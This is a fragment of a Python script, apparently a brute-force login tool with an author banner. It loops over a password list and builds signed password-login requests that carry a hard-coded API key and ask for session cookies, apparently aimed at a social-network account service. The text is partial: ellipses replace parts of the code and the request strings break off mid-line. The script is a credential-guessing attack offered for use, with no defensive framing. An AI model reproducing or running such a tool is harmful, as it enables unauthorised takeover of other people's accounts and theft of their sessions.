...
__banner__ = """
       ...
       +---------------------------------------+
       |#Author: Moussa <Yousseff>             |
       |#Contact: Telegram Moussaa             |
       |#This tool is made for Youssef.        |
       |#Moussa/Yousseff/IMAD  ^_^ !!!         |
       |#YOUSSEF ^_^                           |
       +=======================================+
       |..........Moussa.Ufonet 1..............|
       +---------------------------------------+
...
try:
        ...
        if os.path.exists(passlist) != False:
                ...
                for passwd in open(passlist,'r').readlines():
                        ...
                        sys.stdout.flush()
                        sig = "api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail={}format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmet>
                        xx = hashlib.md5(sig).hexdigest()
                        data = "api_key=882a8490361da98702bf97a021ddc14d&credentials_type=password&email={}&format=JSON&generate_machine_id=1&generate_session_cookies=1&locale=e>
